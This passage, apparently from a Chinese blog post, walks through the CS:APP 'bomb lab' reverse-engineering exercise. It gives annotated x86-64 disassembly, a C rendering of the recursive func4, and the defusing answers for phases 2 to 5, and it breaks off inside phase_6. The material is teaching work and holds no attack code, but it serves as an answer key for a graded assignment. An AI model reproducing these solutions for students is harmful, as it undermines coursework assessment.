<h4 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">0000000000400efc &lt;phase_2&gt;:</span><br><span class="line">  400efc:	55                   	push   %rbp</span><br><span class="line">  400efd:	53                   	push   %rbx</span><br><span class="line">  400efe:	48 83 ec 28          	sub    $0x28,%rsp</span><br><span class="line">  400f02:	48 89 e6             	mov    %rsp,%rsi</span><br><span class="line">  400f05:	e8 52 05 00 00       	callq  40145c &lt;read_six_numbers&gt;</span><br><span class="line">  ;从我们提供的字符串中读入6个数，如果读出数据个数小于6则爆炸;读出数据存放在(%rsp)</span><br><span class="line">  400f0a:	83 3c 24 01          	cmpl   $0x1,(%rsp)</span><br><span class="line">  ;比较第一个数是否是1</span><br><span class="line">  400f0e:	74 20                	je     400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">  ;第一个数是1，跳转</span><br><span class="line">  400f10:	e8 25 05 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  ;第一个数不是1，爆炸</span><br><span class="line">  400f15:	eb 19                	jmp    400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">  400f17:	8b 43 fc             	mov    -0x4(%rbx),%eax</span><br><span class="line">  400f1a:	01 c0                	add    %eax,%eax</span><br><span class="line">  400f1c:	39 03                	cmp    %eax,(%rbx)</span><br><span class="line">  ;比较第i个数是否是第i-1个数的两倍，如果是则继续，不是则爆炸</span><br><span class="line">  400f1e:	74 05                	je     400f25 &lt;phase_2+0x29&gt;</span><br><span class="line">  400f20:	e8 15 05 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f25:	48 83 c3 04          	add    $0x4,%rbx</span><br><span class="line">  ;判断下一个数是否满足要求</span><br><span class="line">  400f29:	48 39 eb             	cmp    %rbp,%rbx</span><br><span class="line">  ;如果%rbx&#x3D;%rbp,6个数全部符合要求，通过phase2</span><br><span class="line">  400f2c:	75 e9                	jne    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">  400f2e:	eb 0c                	jmp    400f3c &lt;phase_2+0x40&gt;</span><br><span class="line">  400f30:	48 8d 5c 24 04       	lea    0x4(%rsp),%rbx</span><br><span class="line">  400f35:	48 8d 6c 24 18       	lea    0x18(%rsp),%rbp</span><br><span class="line">  ;设置结束位，当%rbx&#x3D;%rbp时，说明字符串符合要求，通过phase2</span><br><span class="line">  400f3a:	eb db                	jmp    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">  400f3c:	48 83 c4 28          	add    $0x28,%rsp</span><br><span class="line">  400f40:	5b                   	pop    %rbx</span><br><span class="line">  400f41:	5d                   	pop    %rbp</span><br><span class="line">  400f42:	c3                   	retq   </span><br></pre></td></tr></table></figure>

<p>从上述解析中可以得出,要求输入6个数，第一个数为1，后续每一个数是前一个数的两倍，则phase_2的答案是“1 2 4 8 16 32”</p>
<h4 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">0000000000400f43 &lt;phase_3&gt;:</span><br><span class="line">  400f43:	48 83 ec 18          	sub    $0x18,%rsp</span><br><span class="line">  400f47:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx</span><br><span class="line">  400f4c:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx</span><br><span class="line">  400f51:	be cf 25 40 00       	mov    $0x4025cf,%esi</span><br><span class="line">  400f56:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  400f5b:	e8 90 fc ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  ;print 0x4025cf得到字符串&quot;%d %d&quot;</span><br><span class="line">  ;要求输入2个整数,如果输入的数的个数不对，炸弹爆炸</span><br><span class="line">  400f60:	83 f8 01             	cmp    $0x1,%eax</span><br><span class="line">  400f63:	7f 05                	jg     400f6a &lt;phase_3+0x27&gt;</span><br><span class="line">  400f65:	e8 d0 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f6a:	83 7c 24 08 07       	cmpl   $0x7,0x8(%rsp)</span><br><span class="line">  ;检测输入的第一个数是否大于7，如果是则炸弹爆炸</span><br><span class="line">  400f6f:	77 3c                	ja     400fad &lt;phase_3+0x6a&gt;</span><br><span class="line">  400f71:	8b 44 24 08          	mov    0x8(%rsp),%eax</span><br><span class="line">  400f75:	ff 24 c5 70 24 40 00 	jmpq   *0x402470(,%rax,8)</span><br><span class="line">  ;根据第一个数进行跳转(0x402470存放跳转表)</span><br><span class="line">  ;0x400f7c-&gt;0</span><br><span class="line">  ;0x400fb9-&gt;1</span><br><span class="line">  ;0x400f83-&gt;2</span><br><span class="line">  ;0x400f8a-&gt;3</span><br><span class="line">  ;0x400f91-&gt;4</span><br><span class="line">  ;0x400f98-&gt;5</span><br><span class="line">  ;0x400f9f-&gt;6</span><br><span class="line">  ;0x400fa6-&gt;7</span><br><span class="line">  400f7c:	b8 cf 00 00 00       	mov    $0xcf,%eax</span><br><span class="line">  ;当第一个数为0时跳转到此处</span><br><span class="line">  400f81:	eb 3b                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f83:	b8 c3 02 00 00       	mov    $0x2c3,%eax</span><br><span class="line">  ;当第一个数为2时跳转到此处</span><br><span class="line">  400f88:	eb 34                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f8a:	b8 00 01 00 00       	mov    $0x100,%eax</span><br><span class="line">  ;当第一个数为3时跳转到此处 </span><br><span class="line">  400f8f:	eb 2d                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f91:	b8 85 01 00 00       	mov    $0x185,%eax</span><br><span class="line">  ;当第一个数为4时跳转到此处 </span><br><span class="line">  400f96:	eb 26                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f98:	b8 ce 00 00 00       	mov    $0xce,%eax</span><br><span class="line">  ;当第一个数为5时跳转到此处 </span><br><span class="line">  400f9d:	eb 1f                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f9f:	b8 aa 02 00 00       	mov    $0x2aa,%eax</span><br><span class="line">  ;当第一个数为6时跳转到此处 </span><br><span class="line">  400fa4:	eb 18                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fa6:	b8 47 01 00 00       	mov    $0x147,%eax</span><br><span class="line">  ;当第一个数为7时跳转到此处 </span><br><span class="line">  400fab:	eb 11                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fad:	e8 88 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400fb2:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  400fb7:	eb 05                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fb9:	b8 37 01 00 00       	mov    $0x137,%eax</span><br><span class="line">  ;当第一个数为1时跳转到此处</span><br><span class="line">  400fbe:	3b 44 24 0c          	cmp    0xc(%rsp),%eax</span><br><span class="line">  ;比较第二个数是否等于%eax，如果不等则爆炸，相等则成功拆弹</span><br><span class="line">  400fc2:	74 05                	je     400fc9 &lt;phase_3+0x86&gt;</span><br><span class="line">  400fc4:	e8 71 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400fc9:	48 83 c4 18          	add    $0x18,%rsp</span><br><span class="line">  400fcd:	c3                   	retq   </span><br></pre></td></tr></table></figure>

<p>可以看到，选择不同分支可以得到不同的答案（输入字符串时要写十进制数）,选择其中一个组合就可通过phase_3</p>
<table>
<thead>
<tr>
<th align="center">第一个数</th>
<th align="center">第二个数</th>
</tr>
</thead>
<tbody><tr>
<td align="center">0</td>
<td align="center">0xcf(207)</td>
</tr>
<tr>
<td align="center">1</td>
<td align="center">0x137(311)</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center">0x2c3(707)</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">0x100(256)</td>
</tr>
<tr>
<td align="center">4</td>
<td align="center">0x185(389)</td>
</tr>
<tr>
<td align="center">5</td>
<td align="center">0xce(206)</td>
</tr>
<tr>
<td align="center">6</td>
<td align="center">0x2aa(682)</td>
</tr>
<tr>
<td align="center">7</td>
<td align="center">0x147(327)</td>
</tr>
</tbody></table>
<h4 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">000000000040100c &lt;phase_4&gt;:</span><br><span class="line">  40100c:	48 83 ec 18          	sub    $0x18,%rsp</span><br><span class="line">  401010:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx</span><br><span class="line">  401015:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx</span><br><span class="line">  40101a:	be cf 25 40 00       	mov    $0x4025cf,%esi</span><br><span class="line">  ;和phase_3中一样，0x4025cf处存放字符串&quot;%d %d&quot;和scanf配合使用读入2个数字</span><br><span class="line">  40101f:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401024:	e8 c7 fb ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  401029:	83 f8 02             	cmp    $0x2,%eax</span><br><span class="line">  ;如果读入的数字不是2个，炸弹爆炸</span><br><span class="line">  40102c:	75 07                	jne    401035 &lt;phase_4+0x29&gt;</span><br><span class="line">  40102e:	83 7c 24 08 0e       	cmpl   $0xe,0x8(%rsp)</span><br><span class="line">  ;如果第一个数小于等于14则继续，否则炸弹爆炸</span><br><span class="line">  ;这里是无符号等于，如果第一个数是负数也会爆炸（将补码当作无符号数看）</span><br><span class="line">  401033:	76 05                	jbe    40103a &lt;phase_4+0x2e&gt;</span><br><span class="line">  401035:	e8 00 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  40103a:	ba 0e 00 00 00       	mov    $0xe,%edx</span><br><span class="line">  40103f:	be 00 00 00 00       	mov    $0x0,%esi</span><br><span class="line">  401044:	8b 7c 24 08          	mov    0x8(%rsp),%edi</span><br><span class="line">  ;%rdi-&gt;第一个数 %rsi-&gt;0  %rdx-&gt;0xe  %rcx-&gt;第二个数，进入函数func4</span><br><span class="line">  401048:	e8 81 ff ff ff       	callq  400fce &lt;func4&gt;</span><br><span class="line">  40104d:	85 c0                	test   %eax,%eax</span><br><span class="line">  ;返回值为0则继续，否则炸弹爆炸</span><br><span class="line">  40104f:	75 07                	jne    401058 &lt;phase_4+0x4c&gt;</span><br><span class="line">  401051:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%rsp)</span><br><span class="line">  ;第二个数为0则拆弹成功，否则爆炸</span><br><span class="line">  401056:	74 05                	je     40105d &lt;phase_4+0x51&gt;</span><br><span class="line">  401058:	e8 dd 03 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  40105d:	48 83 c4 18          	add    $0x18,%rsp</span><br><span class="line">  401061:	c3                   	retq   </span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">0000000000400fce &lt;func4&gt;:</span><br><span class="line">  ;这个函数涉及到递归，但是只要输出的答案正确，一次调用就能够返回</span><br><span class="line">  ;随着func4的递归调用，后续函数调用中%rax和%rcx的内容可能有所不同</span><br><span class="line">  ;注释中%rax,%rcx的数值只针对第一次调用的情况</span><br><span class="line">  400fce:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  400fd2:	89 d0                	mov    %edx,%eax</span><br><span class="line">  ;%rax&#x3D;14</span><br><span class="line">  400fd4:	29 f0                	sub    %esi,%eax</span><br><span class="line">  400fd6:	89 c1                	mov    %eax,%ecx</span><br><span class="line">  ;%rcx&#x3D;14</span><br><span class="line">  400fd8:	c1 e9 1f             	shr    $0x1f,%ecx</span><br><span class="line">  ;%rcx&#x3D;0</span><br><span class="line">  400fdb:	01 c8                	add    %ecx,%eax</span><br><span class="line">  400fdd:	d1 f8                	sar    %eax</span><br><span class="line">  ;%eax&#x3D;7</span><br><span class="line">  400fdf:	8d 0c 30             	lea    (%rax,%rsi,1),%ecx</span><br><span class="line">  ;%rcx&#x3D;7</span><br><span class="line">  400fe2:	39 f9                	cmp    %edi,%ecx</span><br><span class="line">  ;比较第一个输入的数和%rcx(7)的大小,如果第一个数大于等于%rcx则跳转到0x400ff2执行</span><br><span class="line">  ;如果第一个数小于%rcx，则将修改%rdx的值，然后递归调用func4</span><br><span class="line">  400fe4:	7e 0c                	jle    400ff2 &lt;func4+0x24&gt;</span><br><span class="line">  400fe6:	8d 51 ff             	lea    -0x1(%rcx),%edx</span><br><span class="line">  400fe9:	e8 e0 ff ff ff       	callq  400fce &lt;func4&gt;</span><br><span class="line">  400fee:	01 c0                	add    %eax,%eax</span><br><span class="line">  400ff0:	eb 15                	jmp    401007 &lt;func4+0x39&gt;</span><br><span class="line">  400ff2:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  400ff7:	39 f9                	cmp    %edi,%ecx</span><br><span class="line">  ;比较第一个输入的数和%rcx(7)的大小,如果第一个数小于等于%rcx则func4调用结束，返回0</span><br><span class="line">  ;如果第一个数大于%rcx，则将修改%rsi的值，然后递归调用func4</span><br><span class="line">  400ff9:	7d 0c                	jge    401007 &lt;func4+0x39&gt;</span><br><span class="line">  400ffb:	8d 71 01             	lea    0x1(%rcx),%esi</span><br><span class="line">  400ffe:	e8 cb ff ff ff       	callq  400fce &lt;func4&gt;</span><br><span class="line">  401003:	8d 44 00 01          	lea    0x1(%rax,%rax,1),%eax</span><br><span class="line">  401007:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">  40100b:	c3                   	retq   </span><br></pre></td></tr></table></figure>

<p>根据上述分析，可以得知fun4用于检验第一个数是否符合要求，根据分析func4一次调用的情况，可以知道当第一个数为7时符合要求，而第二个数则要为0，综上phase_4的答案是“7 0”</p>
<p>对于递归函数func4，我们只考虑了第一次调用就成功返回0的情况，也许通过递归调用，我们能够得到其他答案，为了进一步分析func4，我们将它转化为C程序。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func4</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b,<span class="keyword">int</span> c,<span class="keyword">int</span> d)</span></span>&#123;</span><br><span class="line"><span class="comment">//%rdi-&gt;a   %rsi-&gt;b  %rdx-&gt;c  %rcx-&gt;d</span></span><br><span class="line">	d=c/<span class="number">2</span>+b;</span><br><span class="line">	<span class="keyword">if</span>(d&lt;=a)&#123;</span><br><span class="line">		<span class="keyword">if</span>(a&lt;=d)</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="keyword">return</span> <span class="number">2</span>*func4(a,d+<span class="number">1</span>,c,d)+<span class="number">1</span>;  <span class="comment">//该分支的返回值一定不等于0，不用考虑</span></span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">2</span>*func4(a,b,d<span class="number">-1</span>,d);	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在第一次调用时</p>
<p>a=x,b=0,c=14,d=y   (x为我们输入的第一个数，y是我们输入的第二个数)</p>
<p>当x=7时，调用1次func4返回0</p>
<p>当x=3时，调用2次func4返回0</p>
<p>当x=1时，调用3次func4返回0</p>
<p>当x=0时，调用4次func4返回0</p>
<p>其他情况都不能使func4满足要求，所以phase_4的最终答案为</p>
<p>“7，0” 或 “3，0” 或 “1，0” 或 “0，0”</p>
<h4 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">0000000000401062 &lt;phase_5&gt;:</span><br><span class="line">  401062:	53                   	push   %rbx</span><br><span class="line">  401063:	48 83 ec 20          	sub    $0x20,%rsp</span><br><span class="line">  401067:	48 89 fb             	mov    %rdi,%rbx</span><br><span class="line">  40106a:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax</span><br><span class="line">  401071:	00 00 </span><br><span class="line">  401073:	48 89 44 24 18       	mov    %rax,0x18(%rsp)</span><br><span class="line">  ;设置金丝雀值</span><br><span class="line">  401078:	31 c0                	xor    %eax,%eax</span><br><span class="line">  40107a:	e8 9c 02 00 00       	callq  40131b &lt;string_length&gt;</span><br><span class="line">  40107f:	83 f8 06             	cmp    $0x6,%eax</span><br><span class="line">  ;如果读入的字符串长度不等于6则爆炸</span><br><span class="line">  401082:	74 4e                	je     4010d2 &lt;phase_5+0x70&gt;</span><br><span class="line">  401084:	e8 b1 03 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401089:	eb 47                	jmp    4010d2 &lt;phase_5+0x70&gt;</span><br><span class="line">  ;循环从40108b开始，循环变量存放在%rax处</span><br><span class="line">  40108b:	0f b6 0c 03          	movzbl (%rbx,%rax,1),%ecx</span><br><span class="line">  ;将输入字符串的第%rax个字符(ascii码)写入%rcx</span><br><span class="line">  40108f:	88 0c 24             	mov    %cl,(%rsp)</span><br><span class="line">  401092:	48 8b 14 24          	mov    (%rsp),%rdx</span><br><span class="line">  ;将输入字符串的第%rax个字符(ascii码)写入%rdx</span><br><span class="line">  401096:	83 e2 0f             	and    $0xf,%edx</span><br><span class="line">  ;将输入字符串的第%rax个字符(ascii码)与0xf想与后写入%rdx</span><br><span class="line">  401099:	0f b6 92 b0 24 40 00 	movzbl 0x4024b0(%rdx),%edx</span><br><span class="line">  ;根据%rdx的内容访问字符表</span><br><span class="line">  4010a0:	88 54 04 10          	mov    %dl,0x10(%rsp,%rax,1)</span><br><span class="line">  ;将从跳转表中取出的字符传入以rsp+0x10为初值的第%rax个字符处</span><br><span class="line">  4010a4:	48 83 c0 01          	add    $0x1,%rax</span><br><span class="line">  4010a8:	48 83 f8 06          	cmp    $0x6,%rax</span><br><span class="line">  ;当循环执行6次则跳出</span><br><span class="line">  4010ac:	75 dd                	jne    40108b &lt;phase_5+0x29&gt;</span><br><span class="line">  4010ae:	c6 44 24 16 00       	movb   $0x0,0x16(%rsp)</span><br><span class="line">  4010b3:	be 5e 24 40 00       	mov    $0x40245e,%esi</span><br><span class="line">  4010b8:	48 8d 7c 24 10       	lea    0x10(%rsp),%rdi</span><br><span class="line">  4010bd:	e8 76 02 00 00       	callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">  ;将rsp+0x10开始的6个字符(循环中从字符表取出的6个字符)和0x40245e的6个字符比较</span><br><span class="line">  ;0x40245e-&gt;&quot;flyers&quot;</span><br><span class="line">  ;如果不等则炸弹爆炸</span><br><span class="line">  4010c2:	85 c0                	test   %eax,%eax</span><br><span class="line">  4010c4:	74 13                	je     4010d9 &lt;phase_5+0x77&gt;</span><br><span class="line">  4010c6:	e8 6f 03 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  4010cb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)</span><br><span class="line">  4010d0:	eb 07                	jmp    4010d9 &lt;phase_5+0x77&gt;</span><br><span class="line">  4010d2:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  ;for循环中，初始化%eax&#x3D;0</span><br><span class="line">  4010d7:	eb b2                	jmp    40108b &lt;phase_5+0x29&gt;</span><br><span class="line">  4010d9:	48 8b 44 24 18       	mov    0x18(%rsp),%rax</span><br><span class="line">  4010de:	64 48 33 04 25 28 00 	xor    %fs:0x28,%rax</span><br><span class="line">  ;比对金丝雀值查看是否存在缓冲区溢出</span><br><span class="line">  4010e5:	00 00 </span><br><span class="line">  4010e7:	74 05                	je     4010ee &lt;phase_5+0x8c&gt;</span><br><span class="line">  4010e9:	e8 42 fa ff ff       	callq  400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">  4010ee:	48 83 c4 20          	add    $0x20,%rsp</span><br><span class="line">  4010f2:	5b                   	pop    %rbx</span><br><span class="line">  4010f3:	c3                   	retq   </span><br></pre></td></tr></table></figure>

<p>根据上述的代码分析我们可以知道，这段程序首先会检查我们输入的字符串长度，要求字符串长度为6个字符才能继续执行，然后会根据我们输入的每个<strong>字符的ascii码的低4位</strong>查询位于0x4024b0的字符表，这样可以映射得到新的一串字符(长度同样为6)，最后将其与字符串”flyers”比对，如果相等则拆弹成功。</p>
<p>我们要使映射字符表得到的新字符串等于”flyers”，首先需要知道字符表的内容。</p>
<p>字符表</p>
<table>
<thead>
<tr>
<th align="center">相对于0x4024b0的偏移</th>
<th align="center">字符内容</th>
</tr>
</thead>
<tbody><tr>
<td align="center">0</td>
<td align="center">m</td>
</tr>
<tr>
<td align="center">1</td>
<td align="center">a</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center">d</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">u</td>
</tr>
<tr>
<td align="center">4</td>
<td align="center">i</td>
</tr>
<tr>
<td align="center">5</td>
<td align="center">e</td>
</tr>
<tr>
<td align="center">6</td>
<td align="center">r</td>
</tr>
<tr>
<td align="center">7</td>
<td align="center">s</td>
</tr>
<tr>
<td align="center">8</td>
<td align="center">n</td>
</tr>
<tr>
<td align="center">9</td>
<td align="center">f</td>
</tr>
<tr>
<td align="center">10</td>
<td align="center">o</td>
</tr>
<tr>
<td align="center">11</td>
<td align="center">t</td>
</tr>
<tr>
<td align="center">12</td>
<td align="center">v</td>
</tr>
<tr>
<td align="center">13</td>
<td align="center">b</td>
</tr>
<tr>
<td align="center">14</td>
<td align="center">y</td>
</tr>
<tr>
<td align="center">15</td>
<td align="center">l</td>
</tr>
</tbody></table>
<p>要想根据上表得到”flyers”，我们的六个字符的ascii码的低4位分别位9,f,e,5,6,7</p>
<p>任意取一个高位，假设我们取高4位为6，则对应的ascii码为0x6x（x取上面这6个数）</p>
<p>例如第一个字符就等于0x69–&gt;’ i ‘,以此类推得到字符串为”ionefg”</p>
<p>则字符串”ionefg”为phase_5的一个答案。</p>
<h4 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">00000000004010f4 &lt;phase_6&gt;:</span><br><span class="line">  4010f4:	41 56                	push   %r14</span><br><span class="line">  4010f6:	41 55                	push   %r13</span><br><span class="line">  4010f8:	41 54                	push   %r12</span><br><span class="line">  4010fa:	55                   	push   %rbp</span><br><span class="line">  4010fb:	53                   	push   %rbx</span><br><span class="line">  4010fc:	48 83 ec 50          	sub    $0x50,%rsp</span><br><span class="line">  401100:	49 89 e5             	mov    %rsp,%r13</span><br><span class="line">  401103:	48 89 e6             	mov    %rsp,%rsi</span><br><span class="line">  401106:	e8 51 03 00 00       	callq  40145c &lt;read_six_numbers&gt;</span><br><span class="line">  ;读入6个数</span><br><span class="line">  40110b:	49 89 e6             	mov    %rsp,%r14</span><br><span class="line">  40110e:	41 bc 00 00 00 00    	mov    $0x0,%r12d</span><br><span class="line">  401114:	4c 89 ed             	mov    %r13,%rbp</span><br><span class="line">  401117:	41 8b 45 00          	mov    0x0(%r13),%eax</span><br><span class="line">  40111b:	83 e8 01             	sub    $0x1,%eax</span><br><span class="line">  40111e:	83 f8 05             	cmp    $0x5,%eax</span><br><span class="line">  ;每一个读入的数都要在1~6之间</span><br><span class="line">  401121:	76 05                	jbe    401128 &lt;phase_6+0x34&gt;</span><br><span class="line">  401123:	e8 12 03 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401128:	41 83 c4 01          	add    $0x1,%r12d</span><br><span class="line">  40112c:	41 83 fc 06          	cmp    $0x6,%r12d</span><br><span class="line">  401130:	74 21                	je     401153 &lt;phase_6+0x5f&gt;</span><br><span class="line">  401132:	44 89 e3             	mov    %r12d,%ebx</span><br><span class="line">  401135:	48 63 c3             	movslq %ebx,%rax</span><br><span 